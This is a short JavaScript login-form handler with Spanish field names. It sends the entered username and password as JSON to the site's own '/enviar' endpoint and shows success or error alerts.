document.getElementById('login-form').addEventListener('submit', async function (e) {
  e.preventDefault();

  const usuario = document.getElementById('usuario').value;
  const clave = document.getElementById('clave').value;

  try {
    const response = await fetch('/enviar', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ usuario, clave })
    });

    if (response.ok) {
      alert('Datos enviados correctamente. Esperando aprobación...');
    } else {
      alert('Error al enviar datos');
    }
  } catch (error) {
    console.error('Error al enviar datos:', error);
    alert('Error al enviar datos');
  }
});
